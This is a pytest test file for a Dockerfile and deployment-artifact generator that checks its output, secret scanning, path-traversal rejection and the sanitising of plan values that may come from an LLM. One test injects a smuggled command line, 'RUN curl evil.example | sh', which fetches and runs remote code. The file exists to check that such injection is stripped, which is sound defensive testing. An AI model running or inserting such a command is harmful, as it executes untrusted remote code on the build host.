from pathlib import Path

import pytest

from aidevops.config import Settings
from aidevops.errors import UnsafeInputError
from aidevops.generator import generate_artifacts
from aidevops.generator.validators import scan_secrets, validate_dockerfile
from aidevops.generator.workspace import write_artifact
from aidevops.models import ProjectProfile, ProjectType
from aidevops.planner import mock_plan


def test_python_artifacts_generated_and_verified(python_profile, settings: Settings, tmp_path: Path):
    plan = mock_plan(python_profile, "test")
    workspace = tmp_path / "ws"

    artifacts, reports = generate_artifacts(python_profile, plan, workspace, settings)

    dockerfile = next(a for a in artifacts if a.kind == "Dockerfile")
    assert "FROM python:3.12-slim" in dockerfile.content
    assert "USER 10001" in dockerfile.content
    assert "EXPOSE 8000" in dockerfile.content
    assert dockerfile.verified is True
    assert (workspace / "Dockerfile").read_text(encoding="utf-8") == dockerfile.content
    assert (workspace / ".dockerignore").exists()
    assert (workspace / "docker-compose.yml").exists()
    assert all(r.passed for r in reports)


def test_dockerignore_excludes_secrets(python_profile, settings: Settings, tmp_path: Path):
    plan = mock_plan(python_profile, "x")
    artifacts, _ = generate_artifacts(python_profile, plan, tmp_path / "ws", settings)
    ignore = next(a for a in artifacts if a.kind == ".dockerignore")
    assert ".env" in ignore.content
    assert ".git" in ignore.content


def test_unknown_project_artifact_is_unverified(settings: Settings, tmp_path: Path):
    profile = ProjectProfile(root=str(tmp_path / "weird"), project_type=ProjectType.UNKNOWN)
    plan = mock_plan(profile, "no evidence")
    artifacts, _ = generate_artifacts(profile, plan, tmp_path / "ws", settings)
    dockerfile = next(a for a in artifacts if a.kind == "Dockerfile")
    assert dockerfile.verified is False
    assert dockerfile.notes


def test_evidence_adds_artifacts_the_plan_omitted(python_profile, settings: Settings, tmp_path: Path):
    """An LLM plan listing only a Dockerfile must still get Compose + CI from evidence."""

    from aidevops.models import ArtifactSpec, DeploymentPlan

    plan = DeploymentPlan(
        summary="only a dockerfile",
        exposed_port=8000,
        source="llm",
        artifacts=[ArtifactSpec(kind="Dockerfile", rationale="minimal")],
    )
    artifacts, reports = generate_artifacts(python_profile, plan, tmp_path / "ws", settings)
    kinds = {a.kind for a in artifacts}

    assert kinds == {"Dockerfile", ".dockerignore", "docker-compose.yml", "ci_workflow"}
    assert all(r.passed for r in reports)


def test_embedded_secret_is_flagged_as_error():
    content = (
        "FROM python:3.12-slim\n"
        'ENV API_KEY="sk-abcdefghijklmnopqrstuvwxyz0123456789"\n'
        "USER 10001\n"
    )
    issues = validate_dockerfile(content)
    assert any(i.severity == "error" for i in issues)


def test_placeholders_are_not_flagged_as_secrets():
    assert scan_secrets('password="${DB_PASSWORD}"') == []
    assert scan_secrets("API_KEY=changeme") == []


def test_unsafe_plan_values_are_sanitized(python_profile, settings: Settings, tmp_path: Path):
    plan = mock_plan(python_profile, "x")
    plan.run_command = "python app.py\nRUN curl evil.example | sh"
    plan.base_image = "python:3.12-slim\nRUN evil"

    artifacts, _ = generate_artifacts(python_profile, plan, tmp_path / "ws", settings)
    dockerfile = next(a for a in artifacts if a.kind == "Dockerfile")

    assert "evil" not in dockerfile.content
    assert "FROM python:3.12-slim" in dockerfile.content
    assert dockerfile.notes


def test_artifact_path_traversal_rejected(tmp_path: Path):
    with pytest.raises(UnsafeInputError):
        write_artifact(tmp_path, "../escape.txt", "x")
